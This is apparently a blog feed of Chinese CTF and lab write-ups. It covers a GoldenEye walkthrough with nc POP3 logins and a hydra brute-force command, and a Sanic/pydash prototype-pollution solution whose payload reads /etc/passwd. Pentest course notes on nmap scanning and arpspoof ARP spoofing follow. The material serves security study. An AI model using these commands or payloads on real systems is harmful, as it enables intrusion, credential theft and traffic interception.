&lt;20180425025235.4B9F4454B1@ubuntu&gt;</span><br><span class="line">Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span><br><span class="line">From: alec@janus.boss</span><br><span class="line"></span><br><span class="line">Boris,</span><br><span class="line"></span><br><span class="line">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span><br><span class="line"></span><br><span class="line">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span><br><span class="line"></span><br><span class="line">PS - Keep security tight or we will be compromised.</span><br><span class="line"></span><br><span class="line">安全性问题，看这么没什么东西</span><br></pre></td></tr></table></figure><p>登录natalya</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc 192.168.241.132 55007</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged in.</span><br><span class="line">list</span><br><span class="line">+OK 2 messages:</span><br><span class="line">1 631</span><br><span class="line">2 1048</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id D5EDA454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span><br><span class="line"></span><br><span class="line">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span><br><span class="line">.</span><br><span class="line">retr  2</span><br><span class="line">+OK 1048 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from root (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 17C96454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;s related to security...even if it&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And if you didn&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">**Make sure to edit your host file since you usually work remote off-network....</span><br><span class="line"></span><br><span class="line">Since you&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一封看着没什么东西，但是第二封信就很有搞头了</p><p>给了账号密码</p><p>给了个内部域的登录，并且提示我们要改hosts</p><p>gedit /etc/hosts</p><p>改了以后登录</p><p><a href="http://severnaya-station.com/gnocertdir/">http://severnaya-station.com/gnocertdir/</a></p><p>进入后台<br><img src="https://pic.imgdb.cn/item/667052dad9c307b7e9d7086c.png"></p><p>使用natalya的账号密码登录</p><p>发现一个邮件<br><img src="https://pic.imgdb.cn/item/6670552ed9c307b7e9dc2e08.png"><br>查看<br><img src="https://pic.imgdb.cn/item/66705513d9c307b7e9dbf740.png"><br>发现一个新的名字<br><code>doak</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.241.132 -s 55007 pop3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>原型链污染</title>
      <link href="/2024/06/20/csicn2024_canic_wp/"/>
      <url>/2024/06/20/csicn2024_canic_wp/</url>
      
        <content type="html"><![CDATA[<p>原型链污染的题</p><p>敏感目录提示了是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/src</span><br><span class="line">/admin</span><br></pre></td></tr></table></figure><p>在src里面可以看到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from sanic import Sanic</span><br><span class="line">from sanic.response import text, html</span><br><span class="line">from sanic_session import Session</span><br><span class="line">import pydash</span><br><span class="line"># pydash==5.1.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Pollute:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(&quot;/static/&quot;, &quot;./static/&quot;)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def index(request):</span><br><span class="line">    return html(open(&#x27;static/index.html&#x27;).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/login&quot;)</span><br><span class="line">async def login(request):</span><br><span class="line">    user = request.cookies.get(&quot;user&quot;)</span><br><span class="line">    if user.lower() == &#x27;adm;n&#x27;:</span><br><span class="line">        request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="line">        return text(&quot;login success&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;login fail&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def admin(request):</span><br><span class="line">    if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="line">        key = request.json[&#x27;key&#x27;]</span><br><span class="line">        value = request.json[&#x27;value&#x27;]</span><br><span class="line">        if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            return text(&quot;success&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def index(request):</span><br><span class="line">    return html(open(&#x27;static/index.html&#x27;).read())</span><br></pre></td></tr></table></figure><p>这是一个装饰器.将下面的函数和指定的URL拼接起来，接受的方法为GET,POST</p><p>async def 是一个异步函数，函数名字为Index,接受一个request值</p><p>return html(open(‘static/index.html’))读取static/index.html的文件并将其内容作为相应返回给客户端。</p><p>解释一下什么是异步，正常的同步就是一个一个的做，做完一个才能进行下一个</p><p>但是异步就是比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function cbFn()&#123;</span><br><span class="line">    console.log(&#x27;learnInPro&#x27;);</span><br><span class="line">&#125;, 1000);</span><br><span class="line">console.log(&#x27;sync things&#x27;);</span><br></pre></td></tr></table></figure><p>当js执行到的时候发现是一个异步任务，则会先挂起执行后面的，等到1000ms之后，回调函数cbFn才会执行</p><p>为什么要异步呢，因为js是单线程，效率至上，呵呵</p><p>怎么知道是不是一个异步呢，很简单，看看有么有async def开头，还可通过inspect模块检查一个函数是否异步函数。</p><p>inspect.iscoroutinefunction() 函数可以用于判断一个函数是否为协程函数（包括异步函数）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&quot;/login&quot;)</span><br><span class="line">async def login(request):</span><br><span class="line">    user = request.cookies.get(&quot;user&quot;)</span><br><span class="line">    if user.lower() == &#x27;adm;n&#x27;:</span><br><span class="line">        request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="line">        return text(&quot;login success&quot;)</span><br><span class="line">    return text(&quot;login fail&quot;)</span><br></pre></td></tr></table></figure><p>@app.route(“/login”)表示讲这个异步函数绑定到”/login” 路径上的HTTP请求。当客户端发送到 “/login” 的请求时，该函数将被调用。</p><p>user = request.cookies.get(“user”) 从请求的 Cookie 中获取名为 “user” 的值，并将其赋给 user 变量。</p><p>if user.lower() == ‘adm;n’: 检查用户是否为 “adm;n”。这里使用了 lower() 方法将用户输入的值转换为小写，以进行不区分大小写的比较。</p><p>request.ctx.session[‘admin’] = True 如果用户为 “adm;n”，将在请求上下文（request.ctx）的会话（session）中设置 “admin” 键，并将其值设为 True。</p><p>return text(“login success”) 返回一个响应，其中包含文本内容 “login success”。这将作为登录成功的响应发送给客户端。</p><p>return text(“login fail”) 如果用户不是 “adm;n”，则返回一个响应，其中包含文本内容 “login fail”。这将作为登录失败的响应发送给客户端。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br></pre></td></tr></table></figure><p>return text(open(<strong>file</strong>).read())打开当前代码文件（<strong>file</strong> 表示当前文件的路径），并使用 read() 方法读取其内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def admin(request):</span><br><span class="line">    if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="line">        key = request.json[&#x27;key&#x27;]</span><br><span class="line">        value = request.json[&#x27;value&#x27;]</span><br><span class="line">        if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            return text(&quot;success&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return text(&quot;forbidden&quot;)</span><br></pre></td></tr></table></figure><p>@app.route(“/admin”, methods=[‘GET’, ‘POST’]) 表示将该异步函数绑定到 “/admin” 路径上的HTTP请求，并限定允许的请求方法为 GET 和 POST。当客户端发送到 “/admin” 的 GET 或 POST 请求时，该函数将被调用。</p><p>async def admin(request): 定义了一个异步函数 admin，它接收一个 request 参数，表示HTTP请求对象。</p><p>if request.ctx.session.get(‘admin’) == True: 检查会话中是否存在 ‘admin’ 键，并且其值为 True。这可能是在某个会话管理器中处理用户登录状态的方式。</p><p>key = request.json[‘key’] 从请求的 JSON 数据中获取名为 ‘key’ 的值，并将其赋给 key 变量。</p><p>value = request.json[‘value’] 从请求的 JSON 数据中获取名为 ‘value’ 的值，并将其赋给 value 变量。</p><p>if key and value and type(key) is str and ‘<em>.’ not in key: 检查条件，确保 ‘key’ 和 ‘value’ 非空，且 ‘key’ 的类型为字符串，并且 ‘key’ 中不包含 ‘</em>.’。这是对请求参数的验证。</p><p>pollute = Pollute() 创建一个名为 pollute 的对象，可能是某个类的实例化对象。</p><p>pydash.set_(pollute, key, value) 使用 pydash 库中的 set_ 函数，将 value 设置到 pollute 对象的 key 属性中。这可能是在操作对象的属性赋值。</p><p>return text(“success”) 返回一个响应，其中包含文本内容 “success”。这将作为成功的响应发送给客户端。</p><p>return text(“forbidden”) 如果条件检查不通过，返回一个响应，其中包含文本内容 “forbidden”。这将作为禁止访问的响应发送给客户端。</p><p>所以我们要绕过adm；n的限制，因为这里从session提取，所以会在;进行截断，所以不能直接传，看了师傅的wp说是<strong>RFC2068</strong></p><p>所以我们传cookie:adm\073n即可<br><img src="https://pic.imgdb.cn/item/666ed600d9c307b7e979e2bb.png"></p><p>在cookie中找到session，<br><img src="https://pic.imgdb.cn/item/666ed62fd9c307b7e97a3eb3.png"></p><p>我们的目的是污染file使它可以在flag所在的文件下，所以我们先尝试污染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/666ed6b2d9c307b7e97b35e0.png"></p><p>success，访问/src</p><p><img src="https://pic.imgdb.cn/item/666ed6e8d9c307b7e97b9ff5.png"></p><p><img src="https://pic.imgdb.cn/item/666edad6d9c307b7e9835301.png"></p><p><img src="https://pic.imgdb.cn/item/666edafad9c307b7e9839b29.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/03/08/%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/03/08/%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="title-测试"><a href="#title-测试" class="headerlink" title="title:测试"></a>title:测试</h2><p>这只是一个简简单单的测试，<span id="more"></span>测试能不能只输出一个简介的形式</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2024/03/03/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH7/"/>
      <url>/2024/03/03/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH7/</url>
      
        <content type="html"><![CDATA[<p>emmm，这节课好像没什么笔记，就简单的写一下nmap的使用以及实验中使用两个虚拟机进行arp欺骗</p><h4 id="nmap上帝之眼的使用"><a href="#nmap上帝之眼的使用" class="headerlink" title="nmap上帝之眼的使用"></a>nmap上帝之眼的使用</h4><p>nmap -O </p><p>NMAP -sS</p><h5 id="使用两台虚拟机进行arp欺骗"><a href="#使用两台虚拟机进行arp欺骗" class="headerlink" title="使用两台虚拟机进行arp欺骗"></a>使用两台虚拟机进行arp欺骗</h5><p>上来先安装</p><p>apt install arpscoof</p><p>如果不成功的话进行换源就好了）</p><p>查看是否安装成功</p><p>arpspoof -h</p><p>提示是arpspoof -i 网卡 -t 要攻击的主机ip -r要攻击的主机的默认网关</p><p>我使用的是使用两个虚拟机进行操作</p><p>这时候需要进行端口转发使得能正常使用。</p><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试CH8</title>
      <link href="/2024/03/03/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH8/"/>
      <url>/2024/03/03/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH8/</url>
      
        <content type="html"><![CDATA[<h5 id="网络渗透测试行业标准"><a href="#网络渗透测试行业标准" class="headerlink" title="网络渗透测试行业标准"></a>网络渗透测试行业标准</h5><ul><li>前期与客户的交流阶段‘</li><li>情报的收集阶段</li><li>威胁建模阶段</li><li>漏洞分析阶段</li><li>漏洞利用阶段</li><li>后渗透攻击阶段</li><li>报告阶段</li></ul><p>SAM破解</p><p>kon-boot系统启动盘（）</p><p>挑战/响应认证方式（challenge/response）</p><p>免杀</p><p>双向远程控制连接</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试CH6</title>
      <link href="/2023/12/08/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH6/"/>
      <url>/2023/12/08/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH6/</url>
      
        <content type="html"><![CDATA[<h4 id="RFC1597"><a href="#RFC1597" class="headerlink" title="RFC1597:"></a>RFC1597:</h4><p>一种保存地址空间的方法，这种方法不用给某个企业内部的私有主机分配全局唯一的IP地址，但是允许企业内部之间吗所有主机之间以及企业外部的所有共有主机之间的完全的网络连接。</p><h4 id="IP在公网中是唯一的"><a href="#IP在公网中是唯一的" class="headerlink" title="IP在公网中是唯一的"></a>IP在公网中是唯一的</h4><p>在个人的私有网络中并不是，比如你的内网地址是192.168.xxx.xxx，另一个人的也是，但你不能说你们的公网IP是唯一的，所以要加限制条件</p><h4 id="网络地址转换："><a href="#网络地址转换：" class="headerlink" title="网络地址转换："></a>网络地址转换：</h4><h5 id="SNAT：源网络地址转换："><a href="#SNAT：源网络地址转换：" class="headerlink" title="SNAT：源网络地址转换："></a><strong>SNAT：</strong>源网络地址转换：</h5><p>用于将内部网络中的源IP地址修改为公网可路由的IP地址</p><h5 id="DNAT：目标网络地址转换："><a href="#DNAT：目标网络地址转换：" class="headerlink" title="DNAT：目标网络地址转换："></a><strong>DNAT：</strong>目标网络地址转换：</h5><p>用于将外部请求的目标地址转换为内网中的特定IP地址</p><h5 id="SNAT和DNAT的使用场景："><a href="#SNAT和DNAT的使用场景：" class="headerlink" title="SNAT和DNAT的使用场景："></a>SNAT和DNAT的使用场景：</h5><h6 id="DNAT技术通常用于以下几种情况："><a href="#DNAT技术通常用于以下几种情况：" class="headerlink" title="DNAT技术通常用于以下几种情况："></a>DNAT技术通常用于以下几种情况：</h6><ul><li>允许外部用户通过互联网访问内部Web服务器、邮件服务器等服务。</li><li>允许外部用户通过VPN连接到内部网络。</li><li>允许外部用户使用远程桌面协议（RDP）连接内部Windows服务器。</li></ul><h6 id="SNAT技术通常用于以下几种情况："><a href="#SNAT技术通常用于以下几种情况：" class="headerlink" title="SNAT技术通常用于以下几种情况："></a>SNAT技术通常用于以下几种情况：</h6><ul><li>增加<a href="https://cloud.tencent.com/product/ns?from_column=20065&from=20065">网络安全</a>性，防止来自外部网络的攻击。</li><li>控制流量分配，以提高网络带宽效率。</li><li>允许内部计算机访问外部资源。</li></ul><p>一个端口号是16位表示，65525个端口）</p><h5 id="ISP-Internet-Service-Provider"><a href="#ISP-Internet-Service-Provider" class="headerlink" title="ISP:Internet Service Provider:"></a>ISP:Internet Service Provider:</h5><p>互联网服务提供商，就是联通移动电信这一类给你提供上网的</p><p>ipconfig/release：ip查看并且释放</p><p>ipconfig/renew：ip查看并且重新连接</p><p><strong>防火墙在网络层，WAF在应用层</strong></p><p><strong>为什么防火墙会知道你是ICMP，因为他在解析传输层中会看到里面的协议Protocal</strong></p><p>同一子网，看ARP缓存）</p><p><a href="https://zhuanlan.zhihu.com/p/148644458">https://zhuanlan.zhihu.com/p/148644458</a></p><p>TCP FIN可以用来知道你的从操作系统是什么</p><p>常见的端口号</p><p><a href="https://imgse.com/i/picEaNT"><img src="https://z1.ax1x.com/2023/12/06/picEaNT.png" alt="picEaNT.png"></a></p><p>其中FTP的20端口是用来进行数据传输，21端口是用来进行访问控制</p><h4 id="引导协议BOOTP"><a href="#引导协议BOOTP" class="headerlink" title="引导协议BOOTP"></a>引导协议BOOTP</h4><p>是一种基于UDP的协议。用于从服务器得到自己的IP地址、服务器的IP地址、启动映像文件名、网关IP等等</p><h5 id="获取IP地址的过程"><a href="#获取IP地址的过程" class="headerlink" title="获取IP地址的过程"></a>获取IP地址的过程</h5><p>首先，客户端使用广播形式以IP地址255.255.255.255向网络中发出IP地址查询要求。运行BOOTP协议的服务器接收到这个请求，会发送一个含有IP地址、服务器IP地址、网关等信息的FOUND帧。客户端会根据该FOUND帧来获得自己的IP地址</p><h4 id="动态地址配置协议DHCP协议（Dynamic-Host-Configuration-Protocol）"><a href="#动态地址配置协议DHCP协议（Dynamic-Host-Configuration-Protocol）" class="headerlink" title="动态地址配置协议DHCP协议（Dynamic Host Configuration Protocol）"></a>动态地址配置协议DHCP协议（Dynamic Host Configuration Protocol）</h4><p>DHCP是BOOTP的扩展，基于客户/服务器模式的，提供了一种动态指定IP地址和配置参数的机制。</p><h5 id="DHCP的工作原理"><a href="#DHCP的工作原理" class="headerlink" title="DHCP的工作原理"></a>DHCP的工作原理</h5><p>寻找DHCP服务器（发布一个DHCP广播包来得知DHCP服务器），提供IP租用地址（在某一时间段来使用的地址，并不是固定给这个客户使用），接受IP租约</p><p><a href="https://www.jianshu.com/p/f013acd35898">BOOTP协议与DHCP协议 - 简书 (jianshu.com)</a></p><h4 id="网络指纹："><a href="#网络指纹：" class="headerlink" title="网络指纹："></a>网络指纹：</h4><p>网络指纹是指在互联网上识别和跟踪用户的一种方法，通过收集和分析用户在网络上的行为、设备信息、软件配置等数据来创建对用户的唯一标识。网络指纹通常包括以下内容：</p><ol><li><strong>设备信息</strong>: 包括用户的操作系统、浏览器类型和版本、屏幕分辨率、时区等设备特征。</li><li><strong>网络属性</strong>: 包括用户的 IP 地址、网络提供商（ISP）信息、地理位置等。</li><li><strong>浏览行为</strong>: 包括用户的点击模式、页面浏览习惯、访问频率等。</li><li><strong>其他参数</strong>: 一些网站还可能收集关于用户的其他信息，比如语言设置、插件信息、字体配置等。</li></ol><p>通过收集这些信息，网站和广告商可以创建一个独特的“指纹”来标识和跟踪用户，即使用户在不同设备和网络下访问网站，也可以被识别出来。</p><p>网络指纹技术的使用可以帮助网站提供个性化的服务，但也引发了隐私保护的问题。一些用户可能认为这种行为侵犯了他们的隐私权，因此网络指纹也成为了隐私保护领域的一个重要议题。</p><h5 id="os-fngerprinting"><a href="#os-fngerprinting" class="headerlink" title="os fngerprinting"></a>os fngerprinting</h5><p>操作系统指纹识别（OS fingerprinting）是一种通过识别和分析网络上连接的设备的特征来确定其操作系统的方法。它基于操作系统在网络通信中产生的一些特定行为和响应模式。</p><p>操作系统指纹识别的原理是通过发送一系列特定的网络请求，观察目标设备在响应时所表现出的行为和特征，从而推断出该设备正在运行的操作系统类型和版本。</p><p>这些特征可能包括：</p><ol><li><strong>TCP/IP栈实现</strong>: 不同的操作系统对于TCP/IP协议栈的实现方式有所差异，如TCP/IP选项、初始序列号(ISN)的生成方式等。</li><li><strong>网络协议响应</strong>: 操作系统对网络请求的响应可能会有不同的行为，比如对于某些特定的请求或错误条件的处理方式。</li><li><strong>时间延迟和超时</strong>: 操作系统在响应网络请求时可能会有不同的延迟和超时设置。</li><li><strong>默认开放的网络端口</strong>: 不同操作系统可能会默认打开一些特定的网络端口，这些端口可以用于区分操作系统类型。</li></ol><p>通过分析这些特征，网络安全工具和技术可以尝试识别设备的操作系统，并据此进行针对性的漏洞扫描、探测等操作。</p><p>需要注意的是，操作系统指纹识别并非完全准确，不同的设备和网络环境可能导致结果的误判或不准确性。此外，一些设备可能会采取措施来隐藏或模糊操作系统指纹，以增加网络安全性。</p><h5 id="CIDR地址"><a href="#CIDR地址" class="headerlink" title="CIDR地址"></a>CIDR地址</h5><p>这个佬写的很详细了，我就不买弄了（）</p><p><a href="https://blog.csdn.net/dan15188387481/article/details/49873923">CIDR地址块及其子网划分（内含原始IP地址分类及其子网划分的介绍）_cidr块-CSDN博客</a></p><p>wifi安全性</p><p>学校的wifi根据MAC地址的前六个字节判断是否是虚拟机来请求IP，如果是则拒绝</p><p>防火墙工作原理</p><p>防护墙作用在非军事区，用于将内网和外部网络隔离开</p><p>操作系统协议栈，指纹</p><p>这个上面说了，可以往上回看</p><p>nmap探测</p><p>常见的就是-A -O -sP -p -sV</p><p>-sP 10.0.105.1/24 ：探测10.0.105网段中的全部主机。</p><p>-O IP ：探测指定IP的相关数据。</p><p>-p 端口号1，端口号2 IP : 探测指定IP是否打开指定端口</p><p>-p 端口号1，端口号2 IP -sV：探测指定IP、指定端口是那个版本的软件打开的。</p><p>-A IP -oN 存储路径：在指定路径下生成相关操作的txt报告。</p><p>-A IP ：扫描指定IP的全部内容。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试CH5</title>
      <link href="/2023/12/05/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH5/"/>
      <url>/2023/12/05/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH5/</url>
      
        <content type="html"><![CDATA[<p>上周因为考试咕咕了，这次补上（）</p><p>数据链路只在两个结点</p><p><a href="https://imgse.com/i/picZDmR"><img src="https://z1.ax1x.com/2023/12/06/picZDmR.png" alt="picZDmR.png"></a><br><a href="https://imgse.com/i/picZw6J"><img src="https://z1.ax1x.com/2023/12/06/picZw6J.png" alt="picZw6J.png"></a></p><p>信息封装过程：</p><p><a href="https://imgse.com/i/picZ0X9"><img src="https://z1.ax1x.com/2023/12/06/picZ0X9.png" alt="picZ0X9.png"></a></p><p>HTTP：超文本传输协议</p><p>路由器可以被看成是一台计算机而交换机可以堪称线</p><p>问：怎么知道网关MAC地址</p><p>ARP广播）</p><p>封装时的类型</p><p>0x0800  IP</p><p>0x0806  ARP</p><p>DHCP动态主机配置协议</p><p>DHCP 和DNS协议是在应用层，用UDP</p><p>Ip,子网掩码，DNS服务器，默认网关</p><p>源端口0.0.0.0————–》255.255.255。255</p><p>​            DHCP客户端                                DHCP服务器</p><p>​                                        —-广播—》</p><p>​                                        《—单播—</p><p>可进行的攻击</p><p>ARP假冒</p><p>ARP断网攻击</p><p>制作钓鱼网站</p><p>伪造DNS</p><p>假冒客户端耗尽资源池（死亡之Ping）</p><p>非法冒充DHCP</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透测试 </tag>
            
        </tags>
      
    </entry>
    
